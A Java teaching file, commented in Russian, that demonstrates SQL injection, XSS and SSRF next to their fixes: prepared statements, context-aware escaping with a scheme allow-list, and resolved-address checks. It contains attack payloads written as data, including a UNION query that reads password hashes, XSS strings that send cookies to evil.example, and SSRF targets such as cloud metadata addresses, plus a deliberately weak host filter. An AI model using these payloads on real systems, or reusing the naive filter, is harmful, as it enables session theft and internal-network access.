import java.net.InetAddress;
import java.net.URI;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

// Запуск: java -cp "$(cat target/classpath.txt)" WebVulnDemo.java   (JDK 21, H2 2.5 в памяти)
public class WebVulnDemo {
    public static void main(String[] args) throws Exception {
        sqlInjection();
        xss();
        ssrf();
    }

    // ---------- SQL injection ----------
    static void sqlInjection() throws Exception {
        System.out.println("== sql injection");
        try (Connection db = DriverManager.getConnection("jdbc:h2:mem:pay")) {
            try (Statement s = db.createStatement()) {
                s.execute("create table payment(id int, merchant varchar, amount int)");
                s.execute("insert into payment values (1,'m-7',500),(2,'m-7',700),(3,'m-9',90000),(4,'m-9',12000)");
                s.execute("create table app_user(login varchar, password_hash varchar)");
                s.execute("insert into app_user values ('admin','$2a$12$Q9...')");
            }
            String input = "m-7' OR '1'='1";
            String concat = "select id, amount from payment where merchant = '" + input + "'";
            System.out.println("concat:   " + rows(db.createStatement().executeQuery(concat)));

            String union = "x' UNION SELECT 0, password_hash FROM app_user --";
            try {
                db.createStatement().executeQuery("select id, amount from payment where merchant = '" + union + "'");
            } catch (java.sql.SQLException e) {
                // Текст ошибки, отданный клиенту, сам выносит данные.
                System.out.println("union:    " + e.getMessage().lines().findFirst().orElseThrow());
            }

            var ps = db.prepareStatement("select id, amount from payment where merchant = ?");
            ps.setString(1, input);                          // Значение уходит отдельно от текста запроса.
            System.out.println("prepared: " + rows(ps.executeQuery()));
        }
    }

    static List<String> rows(ResultSet rs) throws Exception {
        List<String> out = new ArrayList<>();
        while (rs.next()) out.add(rs.getString(1) + ":" + rs.getString(2));
        return out;
    }

    // ---------- XSS: экранирование зависит от контекста ----------
    static void xss() {
        System.out.println("== xss");
        String comment = "<img src=x onerror=fetch('//evil.example/?c='+document.cookie)>";
        System.out.println("raw:         <p>" + comment + "</p>");
        System.out.println("html-escape: <p>" + html(comment) + "</p>");

        String link = "javascript:fetch('//evil.example/?c='+document.cookie)";
        System.out.println("href, escaped but unsafe: <a href=\"" + html(link) + "\">site</a>");
        System.out.println("href, scheme allow-list:  " + safeUrl(link));
    }

    static String html(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;");
    }

    static String safeUrl(String s) {
        String scheme = URI.create(s.replace(" ", "%20")).getScheme();
        return "https".equalsIgnoreCase(scheme) ? s : "rejected (scheme " + scheme + ")";
    }

    // ---------- SSRF: адрес проверяют после разрешения имени ----------
    static void ssrf() throws Exception {
        System.out.println("== ssrf");
        for (String url : List.of("https://example.com/logo.png", "https://169.254.169.254/latest/meta-data/",
                "https://2852039166/latest/meta-data/", "https://[::ffff:127.0.0.1]/", "https://localtest.me/",
                "http://localhost:8080/actuator/env")) {
            System.out.printf("%-42s naive=%-8s strict=%s%n", url, naive(url), strict(url));
        }
    }

    // Наивно: запрет по строке хоста.
    static String naive(String url) {
        String host = URI.create(url).getHost();
        return host.startsWith("169.254.") || host.equals("localhost") || host.startsWith("127.") ? "blocked" : "allowed";
    }

    // Строго: разрешить имя и проверить каждый адрес; только https и порт 443.
    static String strict(String url) {
        URI u = URI.create(url);
        if (!"https".equals(u.getScheme()) || (u.getPort() != -1 && u.getPort() != 443)) return "blocked (scheme/port)";
        try {
            for (InetAddress a : InetAddress.getAllByName(u.getHost())) {
                if (a.isLoopbackAddress() || a.isLinkLocalAddress() || a.isSiteLocalAddress() || a.isAnyLocalAddress())
                    return "blocked (" + a.getHostAddress() + ")";
            }
            return "allowed";
        } catch (Exception e) {
            return "blocked (" + e.getClass().getSimpleName() + ")";
        }
    }
}
